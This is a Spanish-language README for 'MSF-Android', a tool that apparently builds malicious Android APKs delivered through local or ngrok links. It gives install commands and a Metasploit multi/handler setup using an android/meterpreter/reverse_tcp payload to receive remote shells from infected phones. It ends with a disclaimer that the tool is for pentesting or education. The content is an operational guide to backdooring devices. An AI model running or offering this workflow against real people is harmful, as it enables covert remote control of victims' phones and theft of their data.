![msf_android](https://user-images.githubusercontent.com/75953873/156860322-6259edbf-475f-4e3a-9ad1-267473e4f16a.png)

Generador de APK's maliciosas para Android | local y remoto.

![msf_android](https://user-images.githubusercontent.com/75953873/156859921-fb62e471-16e6-43f9-809c-245d9ccf57ea.png)

## 📷 SCREENSHOTS 

### Instalando NGROK:
![download_ngrok](https://user-images.githubusercontent.com/75953873/156859956-3ff26083-f760-4f0b-8601-bc3522d069bf.png)


### Creando APK:
![ngrok](https://user-images.githubusercontent.com/75953873/156860013-d3fb2582-7b6a-4ccf-90ff-cdd2084173f7.png)


### Obteniendo enlace **`LOCAL`** && **`REMOTO`**:
![downloadAPK](https://user-images.githubusercontent.com/75953873/156860044-338999aa-7bb6-4e50-9bfe-551bfe7ed5ce.png)

### Obteniendo una sesión meterpreter
![exploit](https://user-images.githubusercontent.com/75953873/156860066-cb01fbe7-8b91-4666-9cb7-02188ad603ac.png)

##### Abrimos una nueva terminal y ejecutamos:
```
> msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
> set LHOST 0.0.0.0
> run
```
![exploit_2](https://user-images.githubusercontent.com/75953873/156860088-75dcb013-275e-4c35-a924-3c1054eba630.png)


## Instalación / Installation

```
> git clone https://github.com/R3LI4NT/MSF-Android
> cd MSF-Android
> pip3 install -r requirements.txt
> sudo python3 msfandroid.py
```


### Importante

**`ES:`** No me hago responsable del mal uso que se le pueda dar a esta herramienta, úselo para Pentesting o fines educativos.

**`EN:`**  I am not responsible for the misuse that may be given to this tool, use it for Pentesting or educational purposes.
